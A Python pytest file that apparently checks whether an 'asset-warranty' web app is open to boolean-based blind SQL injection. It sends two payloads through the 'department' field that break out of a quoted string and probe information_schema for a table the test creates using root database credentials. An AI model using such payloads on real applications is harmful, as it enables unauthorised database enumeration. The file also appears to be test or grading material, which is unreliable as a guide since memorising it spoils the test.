import uuid

import pymysql

from conftest import post_check


def test_information_schema_predicates(target_url):
    table_name = f"probe_{uuid.uuid4().hex[:12]}"
    connection = pymysql.connect(**{
        "host": "asset-warranty-db",
        "port": 3306,
        "user": "root",
        "password": __import__("os").environ["MYSQL_ROOT_PASSWORD"],
        "database": "asset_warranty",
        "autocommit": True,
    })
    try:
        with connection.cursor() as cursor:
            cursor.execute(f"CREATE TABLE `{table_name}` (id INT NOT NULL)")
        present = (
            "OPS' AND (EXISTS(SELECT 1 FROM information_schema.tables "
            f"WHERE table_schema=DATABASE() AND table_name='{table_name}')) -- "
        )
        absent = (
            "OPS' AND (EXISTS(SELECT 1 FROM information_schema.tables "
            "WHERE table_schema=DATABASE() AND table_name='__c7f_nonexistent__')) -- "
        )
        assert post_check(target_url, department=present)["matched"] is True
        assert post_check(target_url, department=absent)["matched"] is False
    finally:
        with connection.cursor() as cursor:
            cursor.execute(f"DROP TABLE IF EXISTS `{table_name}`")
        connection.close()
